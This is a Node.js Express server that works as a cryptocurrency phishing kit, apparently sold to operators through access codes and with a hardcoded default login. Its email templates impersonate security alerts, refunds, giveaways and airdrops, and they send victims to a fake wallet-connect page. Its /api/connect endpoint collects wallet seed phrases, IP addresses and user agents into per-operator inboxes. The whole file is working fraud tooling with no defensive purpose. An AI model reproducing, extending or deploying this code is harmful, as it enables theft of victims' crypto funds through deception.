require("dotenv").config()
const express = require("express")
const path = require("path")
const fs = require("fs")
const bodyParser = require("body-parser")
const nodemailer = require("nodemailer")
const { v4: uuidv4 } = require("uuid")

const app = express()
const PORT = process.env.PORT || 7860

// Middleware
app.use(bodyParser.json())
app.use(express.static(path.join(__dirname)))

// Helper function to ensure the data files exist
function ensureDataFilesExist() {
  const dataPath = path.join(__dirname, "data")

  if (!fs.existsSync(dataPath)) {
    fs.mkdirSync(dataPath, { recursive: true })
  }

  const filesNeeded = ["users.json", "campaigns.json", "phrases.json", "inboxes.json", "auth-codes.json"]

  filesNeeded.forEach((file) => {
    const filePath = path.join(dataPath, file)
    if (!fs.existsSync(filePath)) {
      const defaultData = file === "inboxes.json" ? {} : file === "auth-codes.json" ? { codes: [] } : []
      fs.writeFileSync(filePath, JSON.stringify(defaultData), "utf8")
    }
  })

  // Copy existing files from root to data directory if they exist
  filesNeeded.forEach((file) => {
    const rootFilePath = path.join(__dirname, file)
    const dataFilePath = path.join(dataPath, file)

    if (fs.existsSync(rootFilePath) && !fs.existsSync(dataFilePath)) {
      try {
        const fileContent = fs.readFileSync(rootFilePath, "utf8")
        fs.writeFileSync(dataFilePath, fileContent, "utf8")
        console.log(`Copied ${file} from root to data directory`)
      } catch (error) {
        console.error(`Error copying ${file}:`, error)
      }
    }
  })

  // Ensure auth codes file exists with proper data
  ensureAuthCodesFileExists()
}

// Helper function to ensure the auth-codes.json file exists
function ensureAuthCodesFileExists() {
  const authCodesPath = path.join(__dirname, "data", "auth-codes.json")

  if (!fs.existsSync(authCodesPath)) {
    // Generate 3,000 unique authentication codes
    const codes = generateAuthCodes(3000)
    const authCodesData = {
      codes: codes.map((code) => ({
        code,
        used: false,
        usedBy: null,
        expiresAt: null,
      })),
    }

    fs.writeFileSync(authCodesPath, JSON.stringify(authCodesData, null, 2), "utf8")
    console.log("Created auth-codes.json with 3,000 unique codes")
  }
}

// Function to generate unique authentication codes
function generateAuthCodes(count) {
  const codes = []
  const characters = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789" // Removed similar looking characters

  for (let i = 0; i < count; i++) {
    let code = ""
    // Generate a 16-character code
    for (let j = 0; j < 16; j++) {
      code += characters.charAt(Math.floor(Math.random() * characters.length))
    }

    // Insert some formatting to make it more readable
    code = code.slice(0, 8) + code.slice(8)

    // Ensure uniqueness
    if (codes.includes(code)) {
      i-- // Try again
    } else {
      codes.push(code)
    }
  }

  return codes
}

// Helper functions to read and write data
function readDataFile(filename) {
  const filePath = path.join(__dirname, "data", filename)
  try {
    if (fs.existsSync(filePath)) {
      const rawData = fs.readFileSync(filePath, "utf8")
      return JSON.parse(rawData)
    } else {
      // Try to read from root directory as fallback
      const rootFilePath = path.join(__dirname, filename)
      if (fs.existsSync(rootFilePath)) {
        const rawData = fs.readFileSync(rootFilePath, "utf8")
        return JSON.parse(rawData)
      }
      return filename === "inboxes.json" ? {} : []
    }
  } catch (error) {
    console.error(`Error reading ${filename}:`, error)
    return filename === "inboxes.json" ? {} : []
  }
}

function writeDataFile(filename, data) {
  const dataPath = path.join(__dirname, "data")
  if (!fs.existsSync(dataPath)) {
    fs.mkdirSync(dataPath, { recursive: true })
  }

  const filePath = path.join(dataPath, filename)
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8")

  // Also write to root directory for backward compatibility
  const rootFilePath = path.join(__dirname, filename)
  fs.writeFileSync(rootFilePath, JSON.stringify(data, null, 2), "utf8")
}

// Create a nodemailer transporter
let transporter

// Initialize the transporter
function initializeTransporter() {
  // Check if we have the required environment variables
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.warn("WARNING: EMAIL_USER or EMAIL_PASS environment variables not set. Email sending will not work.")
    return false
  }

  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS, // Use app password if 2FA is enabled
    },
  })

  // Verify the transporter
  transporter.verify((error, success) => {
    if (error) {
      console.error("Error verifying transporter:", error)
      return false
    } else {
      console.log("Server is ready to send emails")
      return true
    }
  })

  return true
}

// Initialize the transporter when the server starts
const transporterInitialized = initializeTransporter()

// NEW API endpoint for login
app.post("/api/login", (req, res) => {
  try {
    const { username, password } = req.body

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: "Username and password are required",
      })
    }

    // Get users from data file
    const users = readDataFile("users.json")

    // Find user
    const user = users.find((u) => u.username === username && u.password === password)

    if (user) {
      return res.json({
        success: true,
        message: "Login successful",
      })
    } else {
      // Default login for EmmyTechLtd
      if (username === "EmmyTechLtd" && password === "EmmyTechLtd") {
        return res.json({
          success: true,
          message: "Login successful",
        })
      }

      return res.status(401).json({
        success: false,
        message: "Invalid username or password",
      })
    }
  } catch (error) {
    console.error("Error during login:", error)
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    })
  }
})

// NEW API endpoint for registration
app.post("/api/register", (req, res) => {
  try {
    const { username, password, email } = req.body

    if (!username || !password || !email) {
      return res.status(400).json({
        success: false,
        message: "Username, password, and email are required",
      })
    }

    // Get users from data file
    const users = readDataFile("users.json")

    // Check if username already exists
    if (users.some((u) => u.username === username)) {
      return res.status(400).json({
        success: false,
        message: "Username already exists",
      })
    }

    // Add new user
    const newUser = {
      username,
      password,
      email,
      createdAt: new Date().toISOString(),
      authenticated: false,
    }

    users.push(newUser)

    // Save to data file
    writeDataFile("users.json", users)

    return res.json({
      success: true,
      message: "Registration successful",
    })
  } catch (error) {
    console.error("Error during registration:", error)
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    })
  }
})

// Modify the GET /api/campaigns endpoint to filter by user
app.get("/api/campaigns", (req, res) => {
  try {
    const userId = req.query.userId // Get userId from query params
    const campaigns = readDataFile("campaigns.json")

    // Filter campaigns by userId if provided
    const filteredCampaigns = userId
      ? campaigns.filter((campaign) => campaign.userId === userId || campaign.sender === userId)
      : campaigns

    return res.json(filteredCampaigns)
  } catch (error) {
    console.error("Error fetching campaigns:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// NEW API endpoint to get user by username
app.get("/api/user/:username", (req, res) => {
  try {
    const { username } = req.params

    if (!username) {
      return res.status(400).json({ error: "Username is required" })
    }

    const users = readDataFile("users.json")
    const user = users.find((u) => u.username === username)

    if (!user) {
      return res.status(404).json({ error: "User not found" })
    }

    // Don't send password to client
    const { password, ...userWithoutPassword } = user
    return res.json(userWithoutPassword)
  } catch (error) {
    console.error("Error fetching user:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// Update the API endpoint to send email to include refund template
app.post("/api/send-email", async (req, res) => {
  try {
    const { type, wallet, email, message, redirectLink, buttonText, sender, userId, refundAmount } = req.body

    // Validate required fields
    if (
      !type ||
      !email ||
      !message ||
      !buttonText ||
      ((type === "UNKNOWN DEVICE LOGIN" || type === "REFUND") && !wallet)
    ) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields",
      })
    }

    // Validate redirect link for non-UNKNOWN DEVICE LOGIN and non-REFUND types
    if (type !== "UNKNOWN DEVICE LOGIN" && type !== "REFUND" && !redirectLink) {
      return res.status(400).json({
        success: false,
        message: "Redirect link is required for this campaign type",
      })
    }

    // Get session info for the sender
    const senderUsername = sender || "Anonymous"

    // Create email content based on campaign type
    let emailSubject, emailHtml
    let finalRedirectLink = redirectLink

    // For UNKNOWN DEVICE LOGIN and REFUND, use the wallet connect page with user ID
    if ((type === "UNKNOWN DEVICE LOGIN" || type === "REFUND") && userId) {
      finalRedirectLink = `${req.protocol}://${req.get("host")}/wallet/index.html#${userId}`
    }

    switch (type) {
      case "UNKNOWN DEVICE LOGIN":
        emailSubject = "Security Alert: Unknown Device Login Detected"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                        <h2 style="color: #d9534f;">Security Alert: Unknown Device Login</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <div style="background-color: #f8f8f8; padding: 15px; margin: 15px 0; border-radius: 5px;">
                            <p><strong>Device:</strong> Chrome (Linux)</p>
                            <p><strong>Wallet:</strong> ${wallet}</p>
                            <p><strong>Location:</strong> United States</p>
                            <p><strong>IP Address:</strong> 192.168.1.1</p>
                        </div>
                        <p>If you don't recognize this activity, take immediate action to secure your account.</p>
                        <a href="${finalRedirectLink}" style="display: inline-block; background-color: #0066ff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 15px 0;">${buttonText}</a>
                        <p style="color: #777; font-size: 12px;">This is an automated security notification. Please do not reply to this email.</p>
                    </div>
                `
        break
      case "REFUND":
        emailSubject = "Refund Notification: Action Required"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #1a1a1a; color: white;">
                        <h2 style="color: #ffffff;">Refund Notification</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <div style="background-color: #2a2a2a; padding: 20px; margin: 15px 0; border-radius: 5px;">
                            <div style="background-color: #3a86ff; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
                                <h3 style="margin: 0; text-align: center;">${refundAmount || "10000 USDT"} Refund Available</h3>
                                <p style="margin: 10px 0 0; text-align: center;">Your verification is required to process the refund.</p>
                            </div>
                            <p><strong>Refund Amount:</strong> <span style="color: #3a86ff; font-size: 18px; font-weight: bold;">${refundAmount || "10000 USDT"}</span></p>
                            <p><strong>Transaction Type:</strong> Refund Process</p>
                            <p><strong>Minimum Required Balance:</strong> ${refundAmount || "10000 USDT"}</p>
                            <p><strong>Status:</strong> <span style="color: #ff9800;">Pending Verification</span></p>
                            <p><strong>Wallet:</strong> ${wallet}</p>
                        </div>
                        <div style="text-align: center; margin: 25px 0;">
                            <a href="${finalRedirectLink}" style="display: inline-block; background-color: #3a86ff; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 16px;">${buttonText}</a>
                        </div>
                        <div style="border-left: 4px solid #ff9800; padding: 10px; background-color: rgba(255, 152, 0, 0.1); margin: 20px 0;">
                            <p style="margin: 0; color: #ff9800;"><strong>Important:</strong> This verification process must be completed within 24 hours for security purposes. After this period, the refund request will expire and must be reinitiated.</p>
                        </div>
                        <p style="color: #999; font-size: 12px; text-align: center; margin-top: 30px;">© Refund Services. All rights reserved.</p>
                    </div>
                `
        break
      case "GIVEAWAY":
        emailSubject = "You've Been Selected for Our Exclusive Giveaway!"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                        <h2 style="color: #5cb85c;">Exclusive Crypto Giveaway!</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <p>Don't miss this opportunity to participate in our special giveaway event.</p>
                        <a href="${finalRedirectLink}" style="display: inline-block; background-color: #0066ff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 15px 0;">${buttonText}</a>
                        <p style="color: #777; font-size: 12px;">If you didn't request this email, please ignore it.</p>
                    </div>
                `
        break
      case "AIRDROP":
        emailSubject = "Claim Your Token Airdrop Now"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                        <h2 style="color: #5bc0de;">Token Airdrop Notification</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <p>Claim your tokens now before the airdrop period ends.</p>
                        <a href="${finalRedirectLink}" style="display: inline-block; background-color: #0066ff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 15px 0;">${buttonText}</a>
                        <p style="color: #777; font-size: 12px;">If you didn't request this email, please ignore it.</p>
                    </div>
                `
        break
      case "ALERT":
        emailSubject = "Important Account Alert"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                        <h2 style="color: #f0ad4e;">Important Account Alert</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <p>Please take action immediately to ensure continued access to your account.</p>
                        <a href="${finalRedirectLink}" style="display: inline-block; background-color: #0066ff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 15px 0;">${buttonText}</a>
                        <p style="color: #777; font-size: 12px;">This is an automated notification. Please do not reply to this email.</p>
                    </div>
                `
        break
      default:
        emailSubject = "Important Notification"
        emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                        <h2 style="color: #0066ff;">Important Notification</h2>
                        <p>Dear User,</p>
                        <p>${message}</p>
                        <a href="${finalRedirectLink}" style="display: inline-block; background-color: #0066ff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 15px 0;">${buttonText}</a>
                        <p style="color: #777; font-size: 12px;">If you didn't request this email, please ignore it.</p>
                    </div>
                `
    }

    // Configure email options
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: emailSubject,
      html: emailHtml,
    }

    // Send email if transporter is initialized
    let messageId = null
    if (transporterInitialized) {
      const info = await transporter.sendMail(mailOptions)
      console.log("Email sent: %s", info.messageId)
      messageId = info.messageId
    } else {
      console.log("Email would have been sent (transporter not initialized)")
    }

    // Save campaign to JSON file
    try {
      const campaigns = readDataFile("campaigns.json")

      // Add new campaign
      campaigns.push({
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        sender: senderUsername,
        recipient: email,
        subject: emailSubject,
        type: type,
        message: message,
        redirectLink: finalRedirectLink,
        buttonText: buttonText,
        wallet: wallet || null,
        userId: userId || null,
        refundAmount: refundAmount || null,
      })

      // Write to file
      writeDataFile("campaigns.json", campaigns)
    } catch (error) {
      console.error("Error saving campaign:", error)
    }

    // Return success response
    res.json({
      success: true,
      message: "Email sent successfully",
      messageId: messageId,
    })
  } catch (error) {
    console.error("Error sending email:", error)
    res.status(500).json({
      success: false,
      message: error.message || "Failed to send email",
    })
  }
})

// API endpoint to save user
app.post("/api/save-user", (req, res) => {
  try {
    const users = req.body
    writeDataFile("users.json", users)
    res.json({ success: true })
  } catch (error) {
    console.error("Error saving user:", error)
    res.status(500).json({
      success: false,
      message: error.message || "Failed to save user",
    })
  }
})

// API endpoint to save campaign
app.post("/api/save-campaign", (req, res) => {
  try {
    const campaigns = req.body
    writeDataFile("campaigns.json", campaigns)
    res.json({ success: true })
  } catch (error) {
    console.error("Error saving campaign:", error)
    res.status(500).json({
      success: false,
      message: error.message || "Failed to save campaign",
    })
  }
})

// Update the API endpoint to handle wallet connections to ensure proper user ID association
app.post("/api/connect", (req, res) => {
  try {
    const { wallet, phrase, timestamp, userAgent, userId } = req.body

    // Validate required fields
    if (!wallet || !phrase) {
      return res.status(400).json({ error: "Wallet and phrase are required" })
    }

    // Get client's IP address
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress

    // Create new phrase record
    const phraseId = uuidv4()
    const newPhrase = {
      id: phraseId,
      wallet,
      phrase,
      timestamp: timestamp || new Date().toISOString(),
      ip,
      userAgent,
      userId: userId || null,
      read: false,
    }

    // Save the phrase to the user's inbox if userId is provided
    if (userId) {
      try {
        // Get inboxes data
        const inboxes = readDataFile("inboxes.json")

        // Initialize user's inbox if it doesn't exist
        if (!inboxes[userId]) {
          inboxes[userId] = []
        }

        // Add phrase to user's inbox
        inboxes[userId].push(newPhrase)

        // Save updated inboxes
        writeDataFile("inboxes.json", inboxes)

        console.log(`Phrase saved to inbox of user ${userId}`)
      } catch (error) {
        console.error("Error saving to inbox:", error)
      }
    }

    // Also save to the general phrases collection for backward compatibility
    try {
      const phrases = readDataFile("phrases.json")
      phrases.unshift(newPhrase)
      writeDataFile("phrases.json", phrases)
    } catch (error) {
      console.error("Error saving phrase:", error)
    }

    // Return success response
    return res.status(200).json({ success: true, message: "Wallet connected successfully" })
  } catch (error) {
    console.error("Error processing wallet connection:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// Update the API endpoint to get inbox for a specific user to include more validation
app.get("/api/inbox/:userId", (req, res) => {
  try {
    const { userId } = req.params

    if (!userId) {
      return res.status(400).json({ error: "User ID is required" })
    }

    // Get inboxes data
    const inboxes = readDataFile("inboxes.json")

    // Return user's inbox or empty array if not found
    const userInbox = inboxes[userId] || []

    return res.status(200).json({ phrases: userInbox })
  } catch (error) {
    console.error("Error fetching inbox:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// Add API endpoint to mark a phrase as read
app.post("/api/inbox/read/:phraseId", (req, res) => {
  try {
    const { phraseId } = req.params

    if (!phraseId) {
      return res.status(400).json({ error: "Phrase ID is required" })
    }

    // Get inboxes data
    const inboxes = readDataFile("inboxes.json")
    let updated = false

    // Find and update the phrase
    Object.keys(inboxes).forEach((userId) => {
      inboxes[userId] = inboxes[userId].map((phrase) => {
        if (phrase.id === phraseId) {
          updated = true
          return { ...phrase, read: true }
        }
        return phrase
      })
    })

    if (updated) {
      // Save updated inboxes
      writeDataFile("inboxes.json", inboxes)
      return res.status(200).json({ success: true })
    } else {
      return res.status(404).json({ error: "Phrase not found" })
    }
  } catch (error) {
    console.error("Error marking phrase as read:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// Add API endpoint to delete a phrase
app.delete("/api/inbox/:phraseId", (req, res) => {
  try {
    const { phraseId } = req.params

    if (!phraseId) {
      return res.status(400).json({ error: "Phrase ID is required" })
    }

    // Get inboxes data
    const inboxes = readDataFile("inboxes.json")
    let deleted = false

    // Find and delete the phrase
    Object.keys(inboxes).forEach((userId) => {
      const initialLength = inboxes[userId].length
      inboxes[userId] = inboxes[userId].filter((phrase) => phrase.id !== phraseId)
      if (inboxes[userId].length < initialLength) {
        deleted = true
      }
    })

    if (deleted) {
      // Save updated inboxes
      writeDataFile("inboxes.json", inboxes)
      return res.status(200).json({ success: true })
    } else {
      return res.status(404).json({ error: "Phrase not found" })
    }
  } catch (error) {
    console.error("Error deleting phrase:", error)
    return res.status(500).json({ error: "Internal server error" })
  }
})

// Add a new API endpoint to validate authentication codes
app.post("/api/validate-auth-code", (req, res) => {
  try {
    const { code, username } = req.body

    if (!code || !username) {
      return res.status(400).json({
        success: false,
        message: "Authentication code and username are required",
      })
    }

    // Read auth codes file
    const authCodesPath = path.join(__dirname, "data", "auth-codes.json")
    const authCodesData = JSON.parse(fs.readFileSync(authCodesPath, "utf8"))

    // Find the code
    const codeIndex = authCodesData.codes.findIndex((c) => c.code === code)

    if (codeIndex === -1) {
      return res.status(400).json({
        success: false,
        message: "Invalid authentication code",
      })
    }

    const codeData = authCodesData.codes[codeIndex]

    // Check if code is already used by someone else
    if (codeData.used && codeData.usedBy !== username) {
      return res.status(400).json({
        success: false,
        message: "This code is already in use by another account",
      })
    }

    // Check if code is expired
    if (codeData.expiresAt && new Date(codeData.expiresAt) < new Date()) {
      // Reset the code
      authCodesData.codes[codeIndex].used = false
      authCodesData.codes[codeIndex].usedBy = null
      authCodesData.codes[codeIndex].expiresAt = null

      // Save changes
      fs.writeFileSync(authCodesPath, JSON.stringify(authCodesData, null, 2), "utf8")

      return res.status(400).json({
        success: false,
        message: "This authentication code has expired",
      })
    }

    // If code is not used yet or used by the same user and not expired
    if (!codeData.used) {
      // Mark code as used
      const expirationDate = new Date()
      expirationDate.setMonth(expirationDate.getMonth() + 1) // Valid for 1 month

      authCodesData.codes[codeIndex].used = true
      authCodesData.codes[codeIndex].usedBy = username
      authCodesData.codes[codeIndex].expiresAt = expirationDate.toISOString()

      // Save changes
      fs.writeFileSync(authCodesPath, JSON.stringify(authCodesData, null, 2), "utf8")
    }

    // Return success with expiration date
    return res.json({
      success: true,
      message: "Authentication successful",
      expiresAt: authCodesData.codes[codeIndex].expiresAt,
    })
  } catch (error) {
    console.error("Error validating auth code:", error)
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    })
  }
})

// Route for the inbox page
app.get("/inbox", (req, res) => {
  res.sendFile(path.join(__dirname, "inbox.html"))
})

// Default route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"))
})

app.get("/app", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"))
})

// 404 handler
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, "error.html"))
})

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`)
  console.log(`- Main site: http://localhost:${PORT}`)
  console.log(`- Inbox: http://localhost:${PORT}/inbox`)
})

// Create data files if they don't exist
ensureDataFilesExist()
